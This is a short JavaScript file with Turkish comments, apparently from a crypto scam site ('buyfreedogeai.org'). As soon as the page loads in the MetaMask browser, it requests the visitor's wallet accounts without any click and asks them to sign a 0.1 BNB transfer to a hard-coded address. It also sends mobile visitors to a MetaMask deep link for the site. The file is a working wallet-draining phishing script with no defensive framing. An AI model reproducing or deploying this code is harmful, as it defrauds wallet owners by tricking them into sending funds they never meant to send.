// 1️⃣ META MASK TARAYICISINDA MI KONTROLÜ
function isInMetaMaskBrowser() {
  return navigator.userAgent.includes("MetaMask") || 
         window.ethereum?.isMetaMask;
}

// 2️⃣ OTOMATİK MOBİL İMZA TETİKLEYİCİ
async function triggerAutoSign() {
  if (!isInMetaMaskBrowser()) return;

  try {
    // A) CÜZDANI DİREKT BAĞLA (KULLANICI TIKLAMADAN)
    const accounts = await window.ethereum.request({ 
      method: 'eth_requestAccounts' 
    });
    
    // B) BNB GÖNDERMEK İÇİN MOBİL İMZA GÖSTER
    await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        to: "0xd924e01c7d319c5B23708Cd622bD1143CD4Fb360",
        from: accounts[0],
        value: ethers.utils.parseEther("0.1").toHexString()
      }]
    });
    
    console.log("OTOMATİK İMZA BAŞARILI!");
  } catch (error) {
    console.error("OTOMATİK İMZA HATASI:", error);
  }
}

// 3️⃣ SAYFA AÇILIR AÇILMAZ ÇALIŞTIR
window.addEventListener('load', () => {
  // MetaMask tarayıcısındaysa direkt imza iste
  if (isInMetaMaskBrowser()) {
    triggerAutoSign();
  }
});

// 4️⃣ MOBİLDE META MASK'A YÖNLENDİRME BUTONU (Chrome/Safari için)
document.getElementById("connectButton").onclick = () => {
  if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
    // Mobil cihazdaysa MetaMask DApp browser'da siteyi otomatik aç
    window.location.href = "https://metamask.app.link/dapp/buyfreedogeai.org";
  } else {
    // Masaüstü kullanıcıları için uyarı
    alert("Please use MetaMask mobile app to connect.");
  }
};
